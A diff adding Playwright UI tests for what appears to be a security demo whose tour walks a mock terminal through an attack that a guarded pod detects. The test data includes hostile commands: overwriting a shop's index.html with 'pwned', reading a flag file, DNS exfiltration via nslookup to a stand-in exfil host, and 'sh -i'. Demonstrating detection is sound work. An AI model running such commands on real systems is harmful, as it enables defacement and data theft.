@@ -491,6 +491,56 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
   });
   }
 
+  test("the default view walks the whole tour from the rail: each step's command chip, then step 5's button, its status and both pods in the rail; a blocked button says why", { tag: "@default" }, async ({ page, isMobile }) => {
+    test.setTimeout(90_000);
+    const problems = guardConsole(page);
+    await page.goto("/?mock=1&mock-speed=0.3&mock-siem-delay=3000");
+    const steps = page.locator("#tour-steps");
+    const term = page.locator("#terminal");
+    const input = term.locator("#term-input");
+    if (isMobile) await page.locator("#tour .tour").getByRole("button", { name: "Show the steps" }).click();
+    const current = (id: string) => steps.locator(`.tour__step[data-id="${id}"][data-current="true"]`);
+    const step = async (id: string, cmd: string) => {
+      // The rail offers that command (the phone's bar has its button instead).
+      if (!isMobile) await expect(current(id).locator(".tour__cmd code")).toHaveText(cmd, { timeout: 10_000 });
+      // The last command sent (the session open from step 1 on).
+      if (id !== "look") await expect(input).toHaveValue("", { timeout: 10_000 });
+      await current(id).locator(".tour__btn").click();
+      await expect(input).toHaveValue(cmd, { timeout: 10_000 });
+      await expect(term.locator(".term__form")).toHaveAttribute("data-step", String(["look", "tamper", "hide", "caught"].indexOf(id) + 1));
+      await expect(input).toBeEnabled({ timeout: 10_000 });
+      await input.press("Enter");
+    };
+    await step("look", "id");
+    await expect(steps.locator('.tour__step[data-id="look"]')).toHaveAttribute("data-done", "true");
+    await step("tamper", "echo pwned>/srv/shop/index.html;echo '{\"status\":\"defaced\"}'>/srv/shop/state.json");
+    // The step's second command, offered once the first has done its part.
+    await step("tamper", "cat /srv/shop/.flag");
+    await expect(steps.locator('.tour__step[data-id="tamper"]')).toHaveAttribute("data-done", "true");
+    await step("hide", "nslookup sdp-<flag>.x.exfil.sdp.test.");
+    await expect(steps.locator('.tour__step[data-id="hide"]')).toHaveAttribute("data-done", "true");
+    await step("caught", "sh -i");
+    await expect(steps.locator('.tour__step[data-id="caught"]')).toHaveAttribute("data-done", "true", { timeout: 15_000 });
+    // 5: the button is in the rail; the launcher's words and both pods show there, the cards being hidden.
+    const five = steps.locator('.tour__step[data-id="compare"]');
+    const launch = five.getByRole("button", { name: "Launch side by side" });
+    await expect(page.locator(".launcher")).toBeHidden();
+    await expect.poll(() => launch.getAttribute("aria-disabled"), { timeout: 15_000 }).toBe("false");
+    await launch.click();
+    await expect(five.locator(".tour__launch")).toHaveAttribute("aria-live", "polite");
+    await expect(five.locator(".tour__launch")).toContainText(/queued as run [0-9a-f]+\. Both pods show here/, { timeout: 10_000 });
+    await expect(five).toHaveAttribute("data-done", "true", { timeout: 20_000 });
+    // While that run plays out the button (now "Run it again") is off and says why.
+    const again = five.locator(".tour__btn").first();
+    if (await again.count()) await expect(again).toHaveAttribute("aria-disabled", "true");
+    await expect(five.locator(".tour__twin dt")).toHaveText(["Guarded", "Unguarded"]);
+    await expect(five.locator(".tour__twin dd").first()).toContainText(/Talon answered in [\d.]+ (ms|s)/, { timeout: 20_000 });
+    await expect(five.locator(".tour__twin dd").nth(1)).toContainText(/nothing answered/, { timeout: 20_000 });
+    // No mark on the hidden card.
+    await expect(page.locator('.scenario[data-suggested="true"]')).toHaveCount(0);
+    expect(problems).toEqual([]);
+  });
+
   test("the terminal keeps one height: six commands later its box is as tall as before, the page has not moved, and each 'why?' is folded to a line", async ({ page }) => {
     await page.goto("/?mock=1&mock-speed=0.3");
     const term = page.locator("#terminal");
@@ -521,7 +571,8 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await expect(why.locator("p")).toBeHidden();
   });
 
-  test("'Do this step' marks what it picked - the input it filled and the command's chip - with a ring and a 'Step n' tag that stays until the step is done", async ({ page }) => {
+  for (const view of ["Technical Mode", "the default view"]) {
+  test(`'Do this step' marks what it picked - the input it filled and the command's chip - with a ring and a 'Step n' tag that stays until the step is done (${view})`, { tag: view === "the default view" ? "@default" : [] }, async ({ page }) => {
     await page.goto("/?mock=1&mock-speed=0.3");
     const tour = page.locator("#tour-steps");
     if (!(await tour.isVisible())) await page.locator("#tour .tour").locator(".tour__btn").click();
@@ -532,7 +583,8 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await expect(form).toHaveAttribute("data-step", "1");
     expect(await form.evaluate((e) => getComputedStyle(e, "::after").content)).toBe('"Step 1"');
     expect(await form.evaluate((e) => getComputedStyle(e).outlineStyle)).toBe("solid");
-    await expect(page.locator('#terminal .term__chip[data-id="whoami"]')).toHaveAttribute("data-suggested", "true");
+    // The palette's chip too, where the palette is shown.
+    if (view === "Technical Mode") await expect(page.locator('#terminal .term__chip[data-id="whoami"]')).toHaveAttribute("data-suggested", "true");
     // Not a flash: still there five seconds on.
     await page.waitForTimeout(5_000);
     await expect(form).toHaveAttribute("data-suggested", "true");
@@ -542,6 +594,8 @@ test.describe("layout (ADR 0035, amended 2026-10-05; ?mock=1)", () => {
     await expect(form).not.toHaveAttribute("data-suggested", "true");
     await expect(page.locator('#terminal .term__chip[data-suggested="true"]')).toHaveCount(0);
   });
+  }
+
 
   test("the tour's side panel never scrolls inside: all six steps in view at 1440x900 and 1920x1080, with four notices the newest two and 'Earlier notices (n)'", async ({ page, isMobile }) => {
     test.skip(isMobile, "the side panel is a wide-screen layout");
